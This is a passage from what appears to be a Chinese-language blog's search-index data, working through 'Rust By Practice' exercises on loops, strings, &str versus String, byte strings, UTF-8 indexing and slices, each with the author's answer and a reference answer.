let mut counter = 0; let result = loop &#123; counter += 1; if counter == 10 &#123; __; &#125; &#125;; assert_eq!(result, 20);&#125; My Answer 1234567891011121314// 填空fn main() &#123; let mut counter = 0; let result = loop &#123; counter += 1; if counter == 10 &#123; break counter*2; &#125; &#125;; assert_eq!(result, 20);&#125; Answer 12345678910111213fn main() &#123; let mut counter = 0; let result = loop &#123; counter += 1; if counter == 10 &#123; break counter * 2; &#125; &#125;; assert_eq!(result, 20);&#125; 🌟🌟🌟 当有多层循环时，你可以使用 continue 或 break 来控制外层的循环。要实现这一点，外部的循环必须拥有一个标签 &#39;label, 然后在 break 或 continue 时指定该标签 12345678910111213141516171819202122232425// 填空fn main() &#123; let mut count = 0; &#x27;outer: loop &#123; &#x27;inner1: loop &#123; if count &gt;= 20 &#123; // 这只会跳出 inner1 循环 break &#x27;inner1; // 这里使用 `break` 也是一样的 &#125; count += 2; &#125; count += 5; &#x27;inner2: loop &#123; if count &gt;= 30 &#123; break &#x27;outer; &#125; continue &#x27;outer; &#125; &#125; assert!(count == __)&#125; My Answer 12345678910111213141516171819202122232425// 填空fn main() &#123; let mut count = 0; &#x27;outer: loop &#123; &#x27;inner1: loop &#123; if count &gt;= 20 &#123; // 这只会跳出 inner1 循环 break &#x27;inner1; // 这里使用 `break` 也是一样的 &#125; count += 2; &#125; count += 5; &#x27;inner2: loop &#123; if count &gt;= 30 &#123; break &#x27;outer; &#125; continue &#x27;outer; &#125; &#125; assert!(count == 30)&#125; Answer 1234567891011121314151617181920212223242526fn main() &#123; let mut count = 0; &#x27;outer: loop &#123; &#x27;inner1: loop &#123; if count &gt;= 20 &#123; // This would break only the inner1 loop break &#x27;inner1; // `break` is also ok &#125; count += 2; &#125; count += 5; &#x27;inner2: loop &#123; if count &gt;= 30 &#123; // This breaks the outer loop break &#x27;outer; &#125; // This will continue the outer loop continue &#x27;outer; &#125; &#125; assert!(count == 30)&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习4 复合类型","slug":"Rust学习-练习4-复合类型","date":"2023-09-02T12:07:46.000Z","updated":"2023-09-10T07:58:32.337Z","comments":true,"path":"2023/09/02/Rust学习-练习4-复合类型/","link":"","permalink":"http://example.com/2023/09/02/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A04-%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B/","excerpt":"复合类型 - Rust By Practice( Rust 练习实践 ) 字符串字符串字面量的类型是 &amp;str， 例如 let s: &amp;str = &quot;hello, world&quot; 中的 &quot;hello, world&quot; 的类型就是 &amp;str。","text":"复合类型 - Rust By Practice( Rust 练习实践 ) 字符串字符串字面量的类型是 &amp;str， 例如 let s: &amp;str = &quot;hello, world&quot; 中的 &quot;hello, world&quot; 的类型就是 &amp;str。 str和&amp;str 🌟 正常情况下我们无法使用 str 类型，但是可以使用 &amp;str 来替代 1234// 修复错误，不要新增代码行fn main() &#123; let s: str = &quot;hello, world&quot;;&#125; My Answer 1234// 修复错误，不要新增代码行fn main() &#123; let s: &amp;str = &quot;hello, world&quot;;&#125; Answer 123fn main() &#123; let s: &amp;str = &quot;hello, world&quot;; &#125; 🌟🌟 如果要使用 str 类型，只能配合 Box。 &amp; 可以用来将 Box&lt;str&gt; 转换为 &amp;str 类型 123456789// 使用至少两种方法来修复错误fn main() &#123; let s: Box&lt;str&gt; = &quot;hello, world&quot;.into(); greetings(s)&#125;fn greetings(s: &amp;str) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; My Answer 123456789// 使用至少两种方法来修复错误fn main() &#123; let s: Box&lt;str&gt; = &quot;hello, world&quot;.into(); greetings(&amp;s)&#125;fn greetings(s: &amp;str) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; Answer 12345678fn main() &#123; let s: Box&lt;str&gt; = &quot;hello, world&quot;.into(); greetings(&amp;s) &#125; fn greetings(s: &amp;str) &#123; println!(&quot;&#123;&#125;&quot;,s) &#125; 12345678fn main() &#123; let s: Box&lt;&amp;str&gt; = &quot;hello, world&quot;.into(); greetings(*s)&#125;fn greetings(s: &amp;str) &#123; println!(&quot;&#123;&#125;&quot;, s);&#125; stringString 是定义在标准库中的类型，分配在堆上，可以动态的增长。它的底层存储是动态字节数组的方式( Vec&lt;u8&gt; )，但是与字节数组不同，String 是 UTF-8 编码。 🌟 12345678// 填空fn main() &#123; let mut s = __; s.push_str(&quot;hello, world&quot;); s.push(&#x27;!&#x27;); assert_eq!(s, &quot;hello, world!&quot;);&#125; My Answer 12345678// 填空fn main() &#123; let mut s = String::from(&quot;&quot;); s.push_str(&quot;hello, world&quot;); s.push(&#x27;!&#x27;); assert_eq!(s, &quot;hello, world!&quot;);&#125; Answer 1234567fn main() &#123; let mut s = String::new(); s.push_str(&quot;hello, world&quot;); s.push(&#x27;!&#x27;); assert_eq!(s, &quot;hello, world!&quot;); &#125; 🌟🌟🌟 123456789// 修复所有错误，并且不要新增代码行fn main() &#123; let s = String::from(&quot;hello&quot;); s.push(&#x27;,&#x27;); s.push(&quot; world&quot;); s += &quot;!&quot;.to_string(); println!(&quot;&#123;&#125;&quot;, s)&#125; My Answer 123456789// 修复所有错误，并且不要新增代码行fn main() &#123; let mut s = String::from(&quot;hello&quot;); s.push(&#x27;,&#x27;); s.push_str(&quot; world&quot;); s += &quot;!&quot;; println!(&quot;&#123;&#125;&quot;, s)&#125; Answer 12345678fn main() &#123; let mut s = String::from(&quot;hello&quot;); s.push(&#x27;,&#x27;); s.push_str(&quot; world&quot;); s += &quot;!&quot;; println!(&quot;&#123;&#125;&quot;, s) &#125; 🌟🌟 我们可以用 replace 方法来替换指定的子字符串 12345678// 填空fn main() &#123; let s = String::from(&quot;I like dogs&quot;); // 以下方法会重新分配一块内存空间，然后将修改后的字符串存在这里 let s1 = s.__(&quot;dogs&quot;, &quot;cats&quot;); assert_eq!(s1, &quot;I like cats&quot;)&#125; My Answer 12345678// 填空fn main() &#123; let s = String::from(&quot;I like dogs&quot;); // 以下方法会重新分配一块内存空间，然后将修改后的字符串存在这里 let s1 = s.replace(&quot;dogs&quot;, &quot;cats&quot;); assert_eq!(s1, &quot;I like cats&quot;)&#125; Answer 1234567fn main() &#123; let s = String::from(&quot;I like dogs&quot;); // Allocate new memory and store the modified string there let s1 = s.replace(&quot;dogs&quot;, &quot;cats&quot;); assert_eq!(s1, &quot;I like cats&quot;) &#125; 在标准库的 String 模块中，有更多的实用方法，感兴趣的同学可以看看。 🌟🌟 你只能将 String 跟 &amp;str 类型进行拼接，并且 String 的所有权在此过程中会被 move 12345678// 修复所有错误，不要删除任何一行代码fn main() &#123; let s1 = String::from(&quot;hello,&quot;); let s2 = String::from(&quot;world!&quot;); let s3 = s1 + s2; assert_eq!(s3,&quot;hello,world!&quot;); println!(&quot;&#123;&#125;&quot;,s1);&#125; My Answer 12345678// 修复所有错误，不要删除任何一行代码fn main() &#123; let s1 = String::from(&quot;hello,&quot;); let s2 = String::from(&quot;world!&quot;); let s3 = s1 + &amp;s2; assert_eq!(s3,&quot;hello,world!&quot;); println!(&quot;&#123;&#125;&quot;,s3);&#125; Answer 1234567fn main() &#123; let s1 = String::from(&quot;hello,&quot;); let s2 = String::from(&quot;world!&quot;); let s3 = s1.clone() + &amp;s2; assert_eq!(s3,&quot;hello,world!&quot;); println!(&quot;&#123;&#125;&quot;,s1);&#125; &amp;str和String与 str 的很少使用相比，&amp;str 和 String 类型却非常常用，因此也非常重要。 🌟🌟 我们可以使用两种方法将 &amp;str 转换成 String 类型 123456789// 使用至少两种方法来修复错误fn main() &#123; let s = &quot;hello, world&quot;; greetings(s)&#125;fn greetings(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; My Answer 123456789// 使用至少两种方法来修复错误fn main() &#123; let s = &quot;hello, world&quot;; greetings(s.to_string())&#125;fn greetings(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; 123456789// 使用至少两种方法来修复错误fn main() &#123; let s = String::from(&quot;hello, world&quot;); greetings(s)&#125;fn greetings(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; Answer 12345678fn main() &#123; let s = &quot;hello, world&quot;.to_string(); greetings(s)&#125;fn greetings(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; 12345678fn main() &#123; let s = String::from(&quot;hello, world&quot;); greetings(s)&#125;fn greetings(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; 🌟🌟 我们可以使用 String::from 或 to_string 将 &amp;str 转换成 String 类型 12345// 使用两种方法来解决错误，不要新增代码行fn main() &#123; let s = &quot;hello, world&quot;.to_string(); let s1: &amp;str = s;&#125; My Answer 12345// 使用两种方法来解决错误，不要新增代码行fn main() &#123; let s = &quot;hello, world&quot;.to_string(); let s1: &amp;str = &amp;s;&#125; 12345// 使用两种方法来解决错误，不要新增代码行fn main() &#123; let s = &quot;hello, world&quot;.to_string(); let s1: &amp;str = &amp;s[..];&#125; Answer 1234fn main() &#123; let s = &quot;hello, world&quot;.to_string(); let s1: &amp;str = &amp;s;&#125; 1234fn main() &#123; let s = &quot;hello, world&quot;; let s1: &amp;str = s;&#125; 1234fn main() &#123; let s = &quot;hello, world&quot;.to_string(); let s1: String = s;&#125; 字符串转义 🌟 1234567891011121314151617181920fn main() &#123; // 你可以使用转义的方式来输出想要的字符，这里我们使用十六进制的值，例如 \\x73 会被转义成小写字母 &#x27;s&#x27; // 填空以输出 &quot;I&#x27;m writing Rust&quot; let byte_escape = &quot;I&#x27;m writing Ru\\x73__!&quot;; println!(&quot;What are you doing\\x3F (\\\\x3F means ?) &#123;&#125;&quot;, byte_escape); // 也可以使用 Unicode 形式的转义字符 let unicode_codepoint = &quot;\\u&#123;211D&#125;&quot;; let character_name = &quot;\\&quot;DOUBLE-STRUCK CAPITAL R\\&quot;&quot;; println!(&quot;Unicode character &#123;&#125; (U+211D) is called &#123;&#125;&quot;, unicode_codepoint, character_name ); // 还能使用 \\ 来连接多行字符串 let long_string = &quot;String literals can span multiple lines. The linebreak and indentation here \\ can be escaped too!&quot;; println!(&quot;&#123;&#125;&quot;, long_string);&#125; 🌟🌟🌟 有时候需要转义的字符很多，我们会希望使用更方便的方式来书写字符串: raw string. 123456789101112131415161718/* 填空并修复所有错误 */fn main() &#123; let raw_str = r&quot;Escapes don&#x27;t work here: \\x3F \\u&#123;211D&#125;&quot;; // 修改上面的行让代码工作 assert_eq!(raw_str, &quot;Escapes don&#x27;t work here: ? ℝ&quot;); // 如果你希望在字符串中使用双引号，可以使用以下形式 let quotes = r#&quot;And then I said: &quot;There is no escape!&quot;&quot;#; println!(&quot;&#123;&#125;&quot;, quotes); // 如果希望在字符串中使用 # 号，可以如下使用： let delimiter = r###&quot;A string with &quot;# in it. And even &quot;##!&quot;###; println!(&quot;&#123;&#125;&quot;, delimiter); // 填空 let long_delimiter = __; assert_eq!(long_delimiter, &quot;Hello, \\&quot;##\\&quot;&quot;)&#125; 字节字符串想要一个非 UTF-8 形式的字符串吗(我们之前的 str, &amp;str, String 都是 UTF-8 字符串) ? 可以试试字节字符串或者说字节数组: 示例: 1234567891011121314151617181920212223242526272829303132333435363738use std::str;fn main() &#123; // 注意，这并不是 `&amp;str` 类型了！ let bytestring: &amp;[u8; 21] = b&quot;this is a byte string&quot;; // 字节数组没有实现 `Display` 特征，因此只能使用 `Debug` 的方式去打印 println!(&quot;A byte string: &#123;:?&#125;&quot;, bytestring); // 字节数组也可以使用转义 let escaped = b&quot;\\x52\\x75\\x73\\x74 as bytes&quot;; // ...但是不支持 unicode 转义 // let escaped = b&quot;\\u&#123;211D&#125; is not allowed&quot;; println!(&quot;Some escaped bytes: &#123;:?&#125;&quot;, escaped); // raw string let raw_bytestring = br&quot;\\u&#123;211D&#125; is not escaped here&quot;; println!(&quot;&#123;:?&#125;&quot;, raw_bytestring); // 将字节数组转成 `str` 类型可能会失败 if let Ok(my_str) = str::from_utf8(raw_bytestring) &#123; println!(&quot;And the same as text: &#x27;&#123;&#125;&#x27;&quot;, my_str); &#125; let _quotes = br#&quot;You can also use &quot;fancier&quot; formatting, \\ like with normal raw strings&quot;#; // 字节数组可以不是 UTF-8 格式 let shift_jis = b&quot;\\x82\\xe6\\x82\\xa8\\x82\\xb1\\x82\\xbb&quot;; // &quot;ようこそ&quot; in SHIFT-JIS // 但是它们未必能转换成 `str` 类型 match str::from_utf8(shift_jis) &#123; Ok(my_str) =&gt; println!(&quot;Conversion successful: &#x27;&#123;&#125;&#x27;&quot;, my_str), Err(e) =&gt; println!(&quot;Conversion failed: &#123;:?&#125;&quot;, e), &#125;;&#125; 如果大家想要了解更多关于字符串字面量、转义字符的话，可以看看 Rust Reference 的 ‘Tokens’ 章节. 字符串索引string index 🌟🌟 你无法通过索引的方式去访问字符串中的某个字符，但是可以使用切片的方式 &amp;s1[start..end] ，但是start 和 end 必须准确落在字符的边界处. 12345678fn main() &#123; let s1 = String::from(&quot;hi,中国&quot;); let h = s1[0]; // 修改当前行来修复错误，提示: `h` 字符在 UTF-8 格式中只需要 1 个字节来表示 assert_eq!(h, &quot;h&quot;); let h1 = &amp;s1[3..5];// 修改当前行来修复错误，提示: `中` 字符在 UTF-8 格式中需要 3 个字节来表示 assert_eq!(h1, &quot;中&quot;);&#125; My Answer 12345678fn main() &#123; let s1 = String::from(&quot;hi,中国&quot;); let h = &amp;s1[0..1]; // 修改当前行来修复错误，提示: `h` 字符在 UTF-8 格式中只需要 1 个字节来表示 assert_eq!(h, &quot;h&quot;); let h1 = &amp;s1[3..6];// 修改当前行来修复错误，提示: `中` 字符在 UTF-8 格式中需要 3 个字节来表示 assert_eq!(h1, &quot;中&quot;);&#125; Answer 12345678fn main() &#123; let s1 = String::from(&quot;hi,中国&quot;); let h = &amp;s1[0..1]; assert_eq!(h, &quot;h&quot;); let h1 = &amp;s1[3..6]; assert_eq!(h1, &quot;中&quot;);&#125; 操作UTF-8字符串 🌟 123456fn main() &#123; // 填空，打印出 &quot;你好，世界&quot; 中的每一个字符 for c in &quot;你好，世界&quot;.__ &#123; println!(&quot;&#123;&#125;&quot;, c) &#125;&#125; My Answer 123456fn main() &#123; // 填空，打印出 &quot;你好，世界&quot; 中的每一个字符 for c in &quot;你好，世界&quot;.chars() &#123; println!(&quot;&#123;&#125;&quot;, c) &#125;&#125; Answer 12345fn main() &#123; for c in &quot;你好，世界&quot;.chars() &#123; println!(&quot;&#123;&#125;&quot;, c) &#125;&#125; 切片切片跟数组相似，但是切片的长度无法在编译期得知，因此你无法直接使用切片类型。 🌟🌟 这里, [i32] 和 str 都是切片类型，但是直接使用它们会造成编译错误，如下代码所示。为了解决，你需要使用切片的引用： &amp;[i32]，&amp;str。 1234567// 修复代码中的错误，不要新增代码行!fn main() &#123; let arr = [1, 2, 3]; let s1: [i32] = arr[0..2]; let s2: str = &quot;hello, world&quot; as str;&#125; My Answer 1234567// 修复代码中的错误，不要新增代码行!fn main() &#123; let arr = [1, 2, 3]; let s1: &amp;[i32] = &amp;arr[0..2]; let s2: &amp;str = &quot;hello, world&quot; as &amp;str;&#125; Answer 123456fn main() &#123; let arr = [1, 2, 3]; let s1: &amp;[i32] = &amp;arr[0..2]; let s2: &amp;str = &quot;hello, world&quot;;&#125; 一个切片引用占用了2个字大小的内存空间( 从现在开始，为了简洁性考虑，如无特殊原因，我们统一使用切片来特指切片引用 )。 该切片的第一个字是指向数据的指针，第二个字是切片的长度。字的大小取决于处理器架构，例如在 x86-64 上，字的大小是 64 位也就是 8 个字节，那么一个切片引用就是 16 个字节大小。 切片( 引用 )可以用来借用数组的某个连续的部分，对应的签名是 &amp;[T]，大家可以与数组的签名对比下 [T; Length]。 🌟🌟🌟 123456789fn main() &#123; let arr: [char; 3] = [&#x27;中&#x27;, &#x27;国&#x27;, &#x27;人&#x27;]; let slice = &amp;arr[..2]; // 修改数字 `8` 让代码工作 // 小提示: 切片和数组不一样，它是引用。如果是数组的话，那下面的 `assert!` 将会通过： &#x27;中&#x27;和&#x27;国&#x27;是char类型，char类型是Unicode编码，大小固定为4字节，两个字符为8字节。 assert!(std::mem::size_of_val(&amp;slice) == 8);&#125; My Answer 12345678fn main() &#123; let arr: [char; 3] = [&#x27;中&#x27;, &#x27;国&#x27;, &#x27;人&#x27;]; let slice = &amp;arr[..2]; // TIPS: slice( reference ) IS NOT an array, because if it is, then `assert!` will passed: each of the two UTF-8 chars &#x27;中&#x27; and &#x27;国&#x27; occupies 4 bytes, 2 * 4 = 8 assert!(std::mem::size_of_val(&amp;slice) == 16);&#125; Answer 12345678fn main() &#123; let arr: [char; 3] = [&#x27;中&#x27;, &#x27;国&#x27;, &#x27;人&#x27;]; let slice = &amp;arr[..2]; // TIPS: slice( reference ) IS NOT an array, because if it is, then `assert!` will passed: each of the two UTF-8 chars &#x27;中&#x27; and &#x27;国&#x27; occupies 4 bytes, 2 * 4 = 8 assert!(std::mem::size_of_val(&amp;slice) == 16);&#125; 🌟🌟 123456fn main() &#123; let arr: [i32; 5] = [1, 2, 3, 4, 5]; // 填空让代码工作起来 let slice: __ = __; assert_eq!(slice, &amp;[2, 3, 4]);&#125; My Answer 123456fn main() &#123; let arr: [i32; 5] = [1, 2, 3, 4, 5]; // 填空让代码工作起来 let slice: &amp;[i32]= &amp;arr[1..4]; assert_eq!(slice, &amp;[2, 3, 4]);&#125; Answer 12345fn main() &#123; let arr: [i32; 5] = [1, 2, 3, 4, 5]; let slice: &amp;[i32] = &amp;arr[1..4]; assert_eq!(slice, &amp;[2, 3, 4]);&#125; 字符串切片 🌟 123456789fn main() &#123; let s = String::from(&quot;hello&quot;); let slice1 = &amp;s[0..2]; // 填空，不要再使用 0..2 let slice2 = &amp;s[__]; assert_eq!(slice1, slice2);&#125; My Answer 123456789fn main() &#123; let s = String::from(&quot;hello&quot;); let slice1 = &amp;s[0..2]; // 填空，不要再使用 0..2 let slice2 = &amp;s[..2]; assert_eq!(slice1, slice2);&#125; Answer 12345678fn main() &#123; let s = String::from(&quot;hello&quot;); let slice1 = &amp;s[0..2]; let slice2 = &amp;s[..2]; assert_eq!(slice1, slice2);&#125; 🌟 1234567fn main() &#123; let s = &quot;你好，世界&quot;; // 修改以下代码行，让代码工作起来 let slice = &amp;s[0..2]; assert!(slice == &quot;你&quot;);&#125; My Answer 1234567fn main() &#123; let s = &quot;你好，世界&quot;; // 修改以下代码行，让代码工作起来 let slice = &amp;s[0..3]; assert!(slice == &quot;你&quot;);&#125; Answer 123456fn main() &#123; let s = &quot;你好，世界&quot;; let slice = &amp;s[0..3]; assert!(slice == &quot;你&quot;);&#125; 🌟🌟 &amp;String 可以被隐式地转换成 &amp;str 类型. 123456789101112131415// 修复所有错误fn main() &#123; let mut s = String::from(&quot;hello world&quot;); // 这里, &amp;s 是 `&amp;String` 类型，但是 `first_character` 函数需要的是 `&amp;str` 类型。 // 尽管两个类型不一样，但是代码仍然可以工作，原因是 `&amp;String` 会被隐式地转换成 `&amp;str` 类型，如果大家想要知道更多，可以看看 Deref 章节: https://course.rs/advance/smart-pointer/deref.html let ch = first_character(&amp;s); s.clear(); // error! println!(&quot;the first character is: &#123;&#125;&quot;, ch);&#125;fn first_character(s: &amp;str) -&gt; &amp;str &#123; &amp;s[..1]&#125; My Answer（重要） 123456789101112131415// 修复所有错误fn main() &#123; let mut s = String::from(&quot;hello world&quot;); // 这里, &amp;s 是 `&amp;String` 类型，但是 `first_character` 函数需要的是 `&amp;str` 类型。 // 尽管两个类型不一样，但是代码仍然可以工作，原因是 `&amp;String` 会被隐式地转换成 `&amp;str` 类型，如果大家想要知道更多，可以看看 Deref 章节: https://course.rs/advance/smart-pointer/deref.html let ch = first_character(&amp;s); println!(&quot;the first character is: &#123;&#125;&quot;, ch); s.clear(); // error!&#125;fn first_character(s: &amp;str) -&gt; &amp;str &#123; &amp;s[..1]&#125; Answer 123456789101112131415fn main() &#123; let mut s = String::from(&quot;hello world&quot;); // here, &amp;s is `&amp;String` type, but `first_word` need a `&amp;str` type. // it works because `&amp;String` can be implicitly converted to `&amp;str, If you want know more ,this is called `Deref` let word = first_word(&amp;s); println!(&quot;the first word is: &#123;&#125;&quot;, word); s.clear();&#125;fn first_word(s: &amp;str) -&gt; &amp;str &#123; &amp;s[..1]&#125; Stringstd::string::String 是 UTF-8 编码、可增长的动态字符串. 它也是我们日常开发中最常用的字符串类型，同时对于它所拥有的内容拥有所有权。 基本操作 🌟🌟 123456789101112131415161718// 填空并修复错误// 1. 不要使用 `to_string()`// 2. 不要添加/删除任何代码行fn main() &#123; let mut s: String = &quot;hello, &quot;; s.push_str(&quot;world&quot;.to_string()); s.push(__); move_ownership(s); assert_eq!(s, &quot;hello, world!&quot;); println!(&quot;Success!&quot;)&#125;fn move_ownership(s: String) &#123; println!(&quot;ownership of \\&quot;&#123;&#125;\\&quot; is moved here!&quot;, s)&#125; My Answer 123456789101112131415161718// 填空并修复错误// 1. 不要使用 `to_string()`// 2. 不要添加/删除任何代码行fn main() &#123; let mut s: String = String::from(&quot;hello, &quot;); s.push_str(&quot;world&quot;); s.push(&#x27;!&#x27;); move_ownership(s.clone()); assert_eq!(s, &quot;hello, world!&quot;); println!(&quot;Success!&quot;)&#125;fn move_ownership(s: String) &#123; println!(&quot;ownership of \\&quot;&#123;&#125;\\&quot; is moved here!&quot;, s)&#125; Answer 123456789101112131415fn main() &#123; let mut s: String = String::from(&quot;hello, &quot;); s.push_str(&quot;world&quot;); s.push(&#x27;!&#x27;); move_ownership(s.clone()); assert_eq!(s, &quot;hello, world!&quot;); println!(&quot;Success!&quot;)&#125;fn move_ownership(s: String) &#123; println!(&quot;ownership of \\&quot;&#123;&#125;\\&quot; is moved here!&quot;, s)&#125; String and &amp;str虽然 String 的底层是 Vec&lt;u8&gt; 也就是字节数组的形式存储的，但是它是基于 UTF-8 编码的字符序列。String 分配在堆上、可增长且不是以 null 结尾。 而 &amp;str 是切片引用类型( &amp;[u8] )，指向一个合法的 UTF-8 字符序列，总之，&amp;str 和 String 的关系类似于 &amp;[T] 和 Vec&lt;T&gt; 。 如果大家想了解更多，可以看看易混淆概念解析 - &amp;str 和 String。 🌟🌟 12345678910111213141516// 填空fn main() &#123; let mut s = String::from(&quot;hello, world&quot;); let slice1: &amp;str = __; // 使用两种方法 assert_eq!(slice1, &quot;hello, world&quot;); let slice2 = __; assert_eq!(slice2, &quot;hello&quot;); let slice3: __ = __; slice3.push(&#x27;!&#x27;); assert_eq!(slice3, &quot;hello, world!&quot;); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516// 填空fn main() &#123; let mut s = String::from(&quot;hello, world&quot;); let slice1: &amp;str = &amp;s; // 使用两种方法 assert_eq!(slice1, &quot;hello, world&quot;); let slice2 = &amp;s[..5]; assert_eq!(slice2, &quot;hello&quot;); let slice3:&amp;mut String = &amp;mut s; slice3.push(&#x27;!&#x27;); assert_eq!(slice3, &quot;hello, world!&quot;); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213141516171819// FILL in the blanksfn main() &#123; // get a slice of String with reference: String -&gt; &amp;str let mut s = String::from(&quot;hello, world&quot;); let slice1: &amp;str = &amp;s; // in two ways assert_eq!(slice1, &quot;hello, world&quot;); let slice2 = &amp;s[0..5]; assert_eq!(slice2, &quot;hello&quot;); //Note! The type here cant be `&amp;mut str` due to `push` is ONLY defined on String type and its mut reference: `&amp;mut String` ! // So you can&#x27;t use `s.as_mut_str()` let slice3: &amp;mut String = &amp;mut s; slice3.push(&#x27;!&#x27;); assert_eq!(slice3, &quot;hello, world!&quot;); println!(&quot;Success!&quot;)&#125; 1234567891011121314151617fn main() &#123; let mut s = String::from(&quot;hello, world&quot;); let slice1: &amp;str = s.as_str(); assert_eq!(slice1, &quot;hello, world&quot;); let slice2 = &amp;s[0..5]; assert_eq!(slice2, &quot;hello&quot;); //Note! The type here cant be `&amp;mut str` due to `push` is ONLY defined on String type and its mut reference: `&amp;mut String` ! // So you can&#x27;t use `s.as_mut_str()` let slice3: &amp;mut String = &amp;mut s; slice3.push(&#x27;!&#x27;); assert_eq!(slice3, &quot;hello, world!&quot;); println!(&quot;Success!&quot;)&#125; 🌟🌟 1234567891011121314151617// 问题: 我们的代码中发生了多少次堆内存分配？// 你的回答: fn main() &#123; // 基于 `&amp;str` 类型创建一个 String, // 字符串字面量的类型是 `&amp;str` let s: String = String::from(&quot;hello, world!&quot;); // 创建一个切片引用指向 String `s` let slice: &amp;str = &amp;s; // 基于刚创建的切片来创建一个 String let s: String = slice.to_string(); assert_eq!(s, &quot;hello, world!&quot;); println!(&quot;Success!&quot;)&#125; My Answer 2 Answer 2 UTF-8&amp;索引由于 String 都是 UTF-8 编码的，这会带来几个影响: 如果你需要的是非 UTF-8 字符串，可以考虑 OsString 无法通过索引的方式访问一个 String 具体请看字符串索引。 🌟🌟🌟 我们无法通过索引的方式访问字符串中的某个字符，但是可以通过切片的方式来获取字符串的某一部分 &amp;s1[start..end] 123456789101112131415161718// 填空并修复错误fn main() &#123; let s = String::from(&quot;hello, 世界&quot;); let slice1 = s[0]; //提示: `h` 在 UTF-8 编码中只占用 1 个字节 assert_eq!(slice1, &quot;h&quot;); let slice2 = &amp;s[3..5];// 提示: `世` 在 UTF-8 编码中占用 3 个字节 assert_eq!(slice2, &quot;世&quot;); // 迭代 s 中的所有字符 for (i, c) in s.__ &#123; if i == 7 &#123; assert_eq!(c, &#x27;世&#x27;) &#125; &#125; println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415161718// 填空并修复错误fn main() &#123; let s = String::from(&quot;hello, 世界&quot;); let slice1 = &amp;s[0..1]; //提示: `h` 在 UTF-8 编码中只占用 1 个字节 assert_eq!(slice1, &quot;h&quot;); let slice2 = &amp;s[7..10];// 提示: `世` 在 UTF-8 编码中占用 3 个字节 assert_eq!(slice2, &quot;世&quot;); // 迭代 s 中的所有字符 for (i, c) in s.chars().enumerate() &#123; if i == 7 &#123; assert_eq!(c, &#x27;世&#x27;) &#125; &#125; println!(&quot;Success!&quot;)&#125; Answer 12345678910111213141516fn main() &#123; let s = String::from(&quot;hello, 世界&quot;); let slice1 = &amp;s[0..1]; //modify this line to fix the error, tips: `h` only takes 1 byte in UTF8 format assert_eq!(slice1, &quot;h&quot;); let slice2 = &amp;s[7..10];//modify this line to fix the error, tips: `中` takes 3 bytes in UTF8 format assert_eq!(slice2, &quot;世&quot;); for (i, c) in s.chars().enumerate() &#123; if i == 7 &#123; assert_eq!(c, &#x27;世&#x27;) &#125; &#125; println!(&quot;Success!&quot;)&#125; utf8_slice我们可以使用 utf8_slice 来按照字符的自然索引方式对 UTF-8 字符串进行切片访问，与之前的切片方式相比，它索引的是字符，而之前的方式索引的是字节. 示例 1234567use utf8_slice;fn main() &#123; let s = &quot;The 🚀 goes to the 🌑!&quot;; let rocket = utf8_slice::slice(s, 4, 5); // Will equal &quot;🚀&quot;&#125; 🌟🌟🌟 提示: 也许你需要使用 from_utf8 方法 123456789101112131415// 填空fn main() &#123; let mut s = String::new(); __; let v = vec![104, 101, 108, 108, 111]; // 将字节数组转换成 String let s1 = __; assert_eq!(s, s1); println!(&quot;Success!&quot;)&#125; My Answer 1234567891011121314151617// FILL in the blanks fn main() &#123; let mut s = String::new(); s.push_str(&quot;hello&quot;); // some bytes, in a vector let v = vec![104, 101, 108, 108, 111]; // Turn a bytes vector into a String // We know these bytes are valid, so we&#x27;ll use `unwrap()`. let s1 = String::from_utf8(v).unwrap(); assert_eq!(s, s1); println!(&quot;Success!&quot;) &#125; Answer 1234567891011121314151617// FILL in the blanks fn main() &#123; let mut s = String::new(); s.push_str(&quot;hello&quot;); // some bytes, in a vector let v = vec![104, 101, 108, 108, 111]; // Turn a bytes vector into a String // We know these bytes are valid, so we&#x27;ll use `unwrap()`. let s1 = String::from_utf8(v).unwrap(); assert_eq!(s, s1); println!(&quot;Success!&quot;) &#125; 事实上 String 是一个智能指针，它作为一个结构体存储在栈上，然后指向存储在堆上的字符串底层数据。 存储在栈上的智能指针结构体由三部分组成：一个指针只指向堆上的字节数组，已使用的长度以及已分配的容量 capacity (已使用的长度小于等于已分配的容量，当容量不够时，会重新分配内存空间)。 🌟🌟 如果 String 的当前容量足够，那么添加字符将不会导致新的内存分配 123456789101112131415161718```rust// 修改下面的代码以打印如下内容: // 25// 25// 25// 循环中不会发生任何内存分配fn main() &#123; let mut s = String::new(); println!(&quot;&#123;&#125;&quot;, s.capacity()); for _ in 0..2 &#123; s.push_str(&quot;hello&quot;); println!(&quot;&#123;&#125;&quot;, s.capacity()); &#125; println!(&quot;Success!&quot;)&#125; 123456789101112131415- My Answer ```rust fn main() &#123; let mut s = String::with_capacity(25); println!(&quot;&#123;&#125;&quot;, s.capacity()); for _ in 0..2 &#123; s.push_str(&quot;hello&quot;); println!(&quot;&#123;&#125;&quot;, s.capacity()); &#125; println!(&quot;Success!&quot;) &#125; Answer 123456789101112fn main() &#123; let mut s = String::with_capacity(25); println!(&quot;&#123;&#125;&quot;, s.capacity()); for _ in 0..2 &#123; s.push_str(&quot;hello&quot;); println!(&quot;&#123;&#125;&quot;, s.capacity()); &#125; println!(&quot;Success!&quot;)&#125; -7. 🌟🌟🌟 